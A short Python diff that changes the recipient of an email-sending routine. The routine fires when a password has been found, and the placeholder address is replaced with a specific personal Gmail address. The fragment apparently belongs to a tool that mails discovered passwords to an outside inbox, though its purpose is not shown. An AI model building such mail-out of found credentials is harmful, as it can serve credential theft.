@@ -29,7 +29,7 @@ class Email:
         try:
             if isPassword:
                 await asyncio.to_thread(self.yag.send,
-                    to="email@address",# update to your own email - this can be a list of emails, I have it set to a single email if you might only want one person to receive the email if there is a password found
+                    to="jcollum142@gmail.com",# update to your own email
                     subject=subject,
                     contents=contents
                 )
